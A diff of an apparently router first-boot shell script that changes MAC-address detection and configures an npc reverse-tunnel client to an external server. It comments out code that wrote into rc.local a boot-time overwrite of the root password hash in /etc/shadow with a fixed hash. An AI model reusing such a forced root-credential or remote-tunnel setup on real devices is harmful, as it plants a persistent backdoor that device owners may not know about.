@@ -90,44 +90,42 @@ if [ ! -f /etc/npc-init.flag ]; then
     #VKEY=$(echo "$WAN_MAC" | tr 'a-z' 'A-Z')
     VKEY=$(echo "$WAN_MAC" | tr 'A-Z' 'a-z')
 
-    # 1. 设置初始接口（原逻辑）
-    WAN_IF=$(uci get network.wan.ifname 2>/dev/null || echo "phy0-ap0")
+    # 定义尝试次数（例如 15 次，每次 1 秒）
+    MAX_RETRIES=15
+    ACTUAL_MAC=""
     
-    # 2. 增加等待逻辑，最多等待 10 秒
-    for i in $(seq 1 10); do
+    echo "Waiting for interface $WAN_IF to become available..." >>$LOGFILE
+    
+    for i in $(seq 1 $MAX_RETRIES); do
         if [ -f "/sys/class/net/$WAN_IF/address" ]; then
-            break
+            ACTUAL_MAC=$(cat "/sys/class/net/$WAN_IF/address")
+            if [ "$ACTUAL_MAC" != "00:00:00:00:00:00" ] && [ -n "$ACTUAL_MAC" ]; then
+                echo "Successfully found MAC: $ACTUAL_MAC at attempt $i" >>$LOGFILE
+                break
+            fi
         fi
         sleep 1
     done
     
-    # 3. 尝试读取原逻辑定义的接口 MAC
-    #WAN_MAC=$(cat /sys/class/net/$WAN_IF/address 2>/dev/null)
-    WAN_MAC=$(cat /sys/class/net/$(ls /sys/class/net | grep -E 'phy|wlan|ra' | head -n1)/address 2>/dev/null)
-
-    # 4. 【你的核心要求】如果取不到，强制改取 eth0 的值
-    if [ -z "$WAN_MAC" ]; then
-        #WAN_MAC=$(cat /sys/class/net/eth0/address 2>/dev/null)
-        WAN_MAC=$(cat /sys/class/net/$(ls /sys/class/net | grep -E 'phy|wlan|ra' | head -n1)/address 2>/dev/null)
-
+    # 如果等了 15 秒还没拿到无线 MAC，强制改拿 eth0（物理网口通常更早在线）
+    if [ -z "$ACTUAL_MAC" ]; then
+        echo "Wireless MAC not found, falling back to eth0..." >>$LOGFILE
+        ACTUAL_MAC=$(cat /sys/class/net/eth0/address 2>/dev/null)
     fi
     
-    # 5. 最终兜底（如果 eth0 也没有，才给全零或原默认值）
-    [ -z "$WAN_MAC" ] && WAN_MAC=$(cat /sys/class/net/$(ls /sys/class/net | grep -E 'phy|wlan|ra' | head -n1)/address 2>/dev/null)
-    
-    # 6. 统一转换为小写生成 VKEY
-    VKEY=$(echo "$WAN_MAC" | tr 'A-Z' 'a-z')
+    # 最终赋值
+    VKEY=$(echo "$ACTUAL_MAC" | tr 'A-Z' 'a-z')
 
     
-# 定义要插入的代码块（注意转义单引号和换行）
-# 这里使用了改进版的带判断逻辑的代码，避免每次开机都强制重写
-sed -i '/exit 0/i \
-# 强制修正 root 密码\
-TARGET_HASH='\'"\$5$XIYpfINJd3s0zJbp$SgFQCsMdqK//e8aTKxpR/AQHrbqZkGm/QuI90ix51Y3"\' '\
-if ! grep -Fq "$TARGET_HASH" /etc/shadow; then\
-    sed -i "s|^root:[^:]*:|root:${TARGET_HASH}:|" /etc/shadow\
-fi\
-' /etc/rc.local
+# # 定义要插入的代码块（注意转义单引号和换行）
+# # 这里使用了改进版的带判断逻辑的代码，避免每次开机都强制重写
+# sed -i '/exit 0/i \
+# # 强制修正 root 密码\
+# TARGET_HASH='\'"\$5$XIYpfINJd3s0zJbp$SgFQCsMdqK//e8aTKxpR/AQHrbqZkGm/QuI90ix51Y3"\' '\
+# if ! grep -Fq "$TARGET_HASH" /etc/shadow; then\
+#     sed -i "s|^root:[^:]*:|root:${TARGET_HASH}:|" /etc/shadow\
+# fi\
+# ' /etc/rc.local
 
     # UCI 配置
     uci set npc.@npc[0].server_addr="nps.5251314.xyz"
